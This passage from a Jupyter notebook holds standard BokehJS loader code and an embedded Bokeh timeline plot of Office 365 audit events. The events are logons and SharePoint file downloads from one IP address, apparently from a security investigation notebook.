       "    function(Bokeh) {\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if ((root.Bokeh !== undefined) || (force === true)) {\n",
       "      for (var i = 0; i < inline_js.length; i++) {\n",
       "        inline_js[i].call(root, root.Bokeh);\n",
       "      }if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"1433\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.log(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(js_urls, function() {\n",
       "      console.log(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof (root._bokeh_onload_callbacks) === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"1433\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) { callback() });\n    }\n    finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.info(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(js_urls, callback) {\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.log(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.log(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = js_urls.length;\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var s = document.createElement('script');\n      s.src = url;\n      s.async = false;\n      s.onreadystatechange = s.onload = function() {\n        root._bokeh_is_loading--;\n        if (root._bokeh_is_loading === 0) {\n          console.log(\"Bokeh: all BokehJS libraries loaded\");\n          run_callbacks()\n        }\n      };\n      s.onerror = function() {\n        console.warn(\"failed to load library \" + url);\n      };\n      console.log(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.getElementsByTagName(\"head\")[0].appendChild(s);\n    }\n  };var element = document.getElementById(\"1433\");\n  if (element == null) {\n    console.log(\"Bokeh: ERROR: autoload.js configured with elementid '1433' but no matching script tag was found. \")\n    return false;\n  }\n\n  var js_urls = [\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-gl-1.0.4.min.js\"];\n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    \n    function(Bokeh) {\n      \n    },\n    function(Bokeh) {\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n    }\n  ];\n\n  function run_inline_js() {\n    \n    if ((root.Bokeh !== undefined) || (force === true)) {\n      for (var i = 0; i < inline_js.length; i++) {\n        inline_js[i].call(root, root.Bokeh);\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"1433\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.log(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(js_urls, function() {\n      console.log(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"375054ca-93c8-4db5-8799-e4444ec34f98\" data-root-id=\"1437\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"58b77eef-08d1-46c9-8180-61c5da375b70\":{\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"1447\",\"type\":\"DatetimeAxis\"}],\"left\":[{\"id\":\"1452\",\"type\":\"LinearAxis\"}],\"min_border_left\":50,\"plot_height\":200,\"plot_width\":900,\"renderers\":[{\"id\":\"1447\",\"type\":\"DatetimeAxis\"},{\"id\":\"1451\",\"type\":\"Grid\"},{\"id\":\"1452\",\"type\":\"LinearAxis\"},{\"id\":\"1456\",\"type\":\"Grid\"},{\"id\":\"1464\",\"type\":\"BoxAnnotation\"},{\"id\":\"1474\",\"type\":\"GlyphRenderer\"},{\"id\":\"1480\",\"type\":\"GlyphRenderer\"}],\"title\":{\"id\":\"1436\",\"type\":\"Title\"},\"toolbar\":{\"id\":\"1461\",\"type\":\"Toolbar\"},\"x_range\":{\"id\":\"1439\",\"type\":\"DataRange1d\"},\"x_scale\":{\"id\":\"1443\",\"type\":\"LinearScale\"},\"y_range\":{\"id\":\"1441\",\"type\":\"DataRange1d\"},\"y_scale\":{\"id\":\"1445\",\"type\":\"LinearScale\"}},\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1494\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1486\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1487\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1488\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1489\",\"type\":\"DaysTicker\"},{\"id\":\"1490\",\"type\":\"DaysTicker\"},{\"id\":\"1491\",\"type\":\"DaysTicker\"},{\"id\":\"1492\",\"type\":\"DaysTicker\"},{\"id\":\"1493\",\"type\":\"MonthsTicker\"},{\"id\":\"1494\",\"type\":\"MonthsTicker\"},{\"id\":\"1495\",\"type\":\"MonthsTicker\"},{\"id\":\"1496\",\"type\":\"MonthsTicker\"},{\"id\":\"1497\",\"type\":\"YearsTicker\"}]},\"id\":\"1448\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1495\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1476\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1478\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1479\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1481\",\"type\":\"CDSView\"}},\"id\":\"1480\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"plot\":{\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1448\",\"type\":\"DatetimeTicker\"}},\"id\":\"1451\",\"type\":\"Grid\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1496\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"formatter\":{\"id\":\"1485\",\"type\":\"BasicTickFormatter\"},\"plot\":{\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1453\",\"type\":\"BasicTicker\"},\"visible\":false},\"id\":\"1452\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"1497\",\"type\":\"YearsTicker\"},{\"attributes\":{},\"id\":\"1453\",\"type\":\"BasicTicker\"},{\"attributes\":{},\"id\":\"1498\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"callback\":null,\"data\":{\"Operation\":[\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoginFailed\",\"UserLoginFailed\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoggedIn\",\"UserLoginFailed\",\"UserLoggedIn\",\"UserLoggedIn\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileAccessed\",\"FileAccessed\",\"FileAccessed\",\"FileAccessed\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"PageViewed\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FilePreviewed\",\"FilePreviewed\",\"FilePreviewed\"],\"RecordType\":[\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"AzureActiveDirectoryStsLogon\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePoint\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\"],\"TimeGenerated\":{\"__ndarray__\":\"AIAWkUaPdkIAAMd+Ro92QgAAeYtGj3ZCAAB5i0aPdkIAgJR8Ro92QgCAlHxGj3ZCAICUfEaPdkIAgCl5Ro92QgAAD3NGj3ZCAABFakaPdkIAANl7Ro92QgCAmntGj3ZCAICae0aPdkIAANl7Ro92QgAAYY9Gj3ZCAICljkaPdkIAAOqNRo92QgCA9GxGj3ZCAIAckEaPdkIAAFuQRo92QgAACIlGj3ZCAAAIiUaPdkIAAIuIRo92QgCAC35Gj3ZCAIALfkaPdkIAgAt+Ro92QgCAiH5Gj3ZCAAAIiUaPdkIAAAiJRo92QgCAyYhGj3ZCAIBMiEaPdkIAgM+HRo92QgAAkYdGj3ZCAIBSh0aPdkIAgFKHRo92QgAAFIdGj3ZCAIDVhkaPdkIAgFiGRo92QgAAGoZGj3ZCAACdhUaPdkIAAJ2FRo92QgAAIIVGj3ZCAACjhEaPdkIAgGSERo92QgAAJoRGj3ZCAAAmhEaPdkIAgOeDRo92QgCAaoNGj3ZCAACvgkaPdkIAgBF9Ro92QgAACIlGj3ZCAAAIiUaPdkIAAIuIRo92QgAADohGj3ZCAACRh0aPdkIAAJGHRo92QgCAUodGj3ZCAAAUh0aPdkIAgNWGRo92QgAAl4ZGj3ZCAIBYhkaPdkIAgNuFRo92QgAAnYVGj3ZCAIBehUaPdkIAgOGERo92QgCAZIRGj3ZCAIBkhEaPdkIAACaERo92QgCA54NGj3ZCAACpg0aPdkIAACyDRo92QgAAr4JGj3ZCAABQfUaPdkIAAFB9Ro92QgAAUH1Gj3ZC\",\"dtype\":\"float64\",\"shape\":[75]},\"UserId\":[\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@M365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,77],\"y_index\":[2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2]},\"selected\":{\"id\":\"1499\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1498\",\"type\":\"UnionRenderers\"}},\"id\":\"1434\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"dimension\":1,\"plot\":{\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1453\",\"type\":\"BasicTicker\"}},\"id\":\"1456\",\"type\":\"Grid\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1479\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1499\",\"type\":\"Selection\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"green\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"green\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1478\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1500\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"1435\",\"type\":\"HoverTool\"},{\"id\":\"1457\",\"type\":\"PanTool\"},{\"id\":\"1458\",\"type\":\"WheelZoomTool\"},{\"id\":\"1459\",\"type\":\"BoxZoomTool\"},{\"id\":\"1460\",\"type\":\"ResetTool\"}]},\"id\":\"1461\",\"type\":\"Toolbar\"},{\"attributes\":{\"source\":{\"id\":\"1476\",\"type\":\"ColumnDataSource\"}},\"id\":\"1481\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1457\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"1501\",\"type\":\"Selection\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1458\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"1485\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"overlay\":{\"id\":\"1464\",\"type\":\"BoxAnnotation\"}},\"id\":\"1459\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1486\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"plot\":null,\"text\":\"Timeline Operations from 23.97.60.214 (all=blue, FileDownloaded=green)\"},\"id\":\"1436\",\"type\":\"Title\"},{\"attributes\":{},\"id\":\"1460\",\"type\":\"ResetTool\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1487\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1469\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1488\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"lightgrey\"},\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":{\"value\":1.0},\"line_color\":{\"value\":\"black\"},\"line_dash\":[4,4],\"line_width\":{\"value\":2},\"plot\":null,\"render_mode\":\"css\",\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"1464\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"UserId\",\"@UserId\"],[\"RecordType\",\"@RecordType\"],[\"Operation\",\"@Operation\"]]},\"id\":\"1435\",\"type\":\"HoverTool\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1489\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"navy\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1472\",\"type\":\"Circle\"},{\"attributes\":{\"callback\":null},\"id\":\"1439\",\"type\":\"DataRange1d\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1490\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1473\",\"type\":\"Circle\"},{\"attributes\":{\"callback\":null},\"id\":\"1441\",\"type\":\"DataRange1d\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1491\",\"type\":\"DaysTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1434\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1472\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1473\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1475\",\"type\":\"CDSView\"}},\"id\":\"1474\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1443\",\"type\":\"LinearScale\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1492\",\"type\":\"DaysTicker\"},{\"attributes\":{\"source\":{\"id\":\"1434\",\"type\":\"ColumnDataSource\"}},\"id\":\"1475\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1445\",\"type\":\"LinearScale\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1493\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"callback\":null,\"data\":{\"Operation\":[\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\",\"FileDownloaded\"],\"RecordType\":[\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\",\"SharePointFileOperation\"],\"TimeGenerated\":{\"__ndarray__\":\"AAAIiUaPdkIAAAiJRo92QgAAi4hGj3ZCAAAIiUaPdkIAAAiJRo92QgCAyYhGj3ZCAIBMiEaPdkIAgM+HRo92QgAAkYdGj3ZCAIBSh0aPdkIA